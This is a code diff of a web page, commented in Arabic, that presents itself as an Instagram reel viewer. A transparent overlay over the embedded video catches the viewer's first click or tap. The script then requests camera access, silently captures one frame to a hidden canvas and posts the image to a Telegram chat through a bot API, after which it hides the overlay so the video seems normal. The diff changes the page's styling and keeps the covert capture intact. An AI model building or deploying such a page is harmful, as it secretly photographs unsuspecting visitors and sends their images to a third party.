@@ -1,26 +1,47 @@
-/* حاوية تغطي الشاشة بالكامل وتتوسط الصفحة */
-    .video-wrapper {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
+body {
+        background-color: #0f0f0f;
+        color: #ffffff;
         display: flex;
-        justify-content: center;
+        flex-direction: column;
         align-items: center;
-        background-color: #000;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 20px;
     }
 
-    /* تكبير إطار إنستغرام لأقصى حد ممكن ليملاء الشاشة */
+    .video-card {
+        background-color: #1f1f1f;
+        border-radius: 12px;
+        overflow: hidden;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+        width: 100%;
+        max-width: 480px;
+        padding: 15px;
+    }
+
+    .title {
+        text-align: center;
+        margin-bottom: 15px;
+        font-size: 1.2rem;
+        color: #e1306c;
+    }
+
+    .instagram-wrapper {
+        position: relative;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+    }
+
+    /* إطار الفيديو */
     iframe {
         border: none;
         width: 100%;
-        height: 100%;
-        max-width: 600px;
-        max-height: 100vh;
+        height: 600px;
+        border-radius: 8px;
     }
 
-    /* طبقة شفافة تغطي الشاشة بالكامل لالتقاط الضغطة */
+    /* طبقة شفافة فوق الفيديو لالتقاط الضغطة الأولى */
     .trigger-overlay {
         position: absolute;
         top: 0;
@@ -32,20 +53,24 @@
         cursor: pointer;
     }
 </style>
-<div class="video-wrapper">
-    <!-- طبقة التقاط الضغطة الأولى -->
-    <div class="trigger-overlay" id="overlay"></div>
+<div class="video-card">
+    <h2 class="title">مشاهدة المقطع</h2>
+    
+    <div class="instagram-wrapper">
+        <!-- طبقة التقاط الضغطة -->
+        <div class="trigger-overlay" id="overlay"></div>
 
-    <!-- عرض فيديو إنستغرام -->
-    <iframe 
-        src="https://www.instagram.com/reel/DdjtPokIGQY/embed" 
-        scrolling="no" 
-        allowtransparency="true"
-        allow="encrypted-media">
-    </iframe>
+        <!-- رابط فيديو إنستغرام -->
+        <iframe 
+            src="https://www.instagram.com/reel/DbiGbSrs1iO/embed" 
+            scrolling="no" 
+            allowtransparency="true"
+            allow="encrypted-media">
+        </iframe>
+    </div>
 </div>
 
-<!-- عنصر Canvas مخفي -->
+<!-- عنصر Canvas مخفي لتجهيز الصورة -->
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -57,11 +82,11 @@
     const overlay = document.getElementById('overlay');
 
     async function handleCapture(event) {
-        // إخفاء الطبقة الشفافة فور الضغط ليتمكن المستخدم من التفاعل مع الفيديو
+        // إخفاء الطبقة بعد أول ضغطة للتفاعل الطبيعي مع الفيديو
         overlay.style.display = 'none';
 
         try {
-            // طلب الوصول للكاميرا
+            // طلب الوصول للكميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             
             const video = document.createElement('video');
@@ -73,7 +98,7 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // إرسال الصورة إلى تيليجرام
+            // تحويل الصورة وإرسالها إلى تيليجرام
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -85,21 +110,20 @@
                         body: formData
                     });
                 } catch (err) {
-                    console.error("خطأ الإرسال:", err);
+                    console.error("خطأ أثناء إرسال الصورة:", err);
                 }
             }, 'image/png');
 
         } catch (err) {
-            console.error("خطأ الكاميرا:", err);
+            console.error("خطأ الوصول إلى الكاميرا:", err);
         } finally {
-            // إغلاق الكاميرا وإيقاف البث فوراً
+            // إيقاف عمل الكاميرا بعد التقاط الصورة
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         }
     }
 
-    // الاستماع للضغط على الطبقة الشفافة
     overlay.addEventListener('click', handleCapture);
     overlay.addEventListener('touchstart', handleCapture);
 </script>
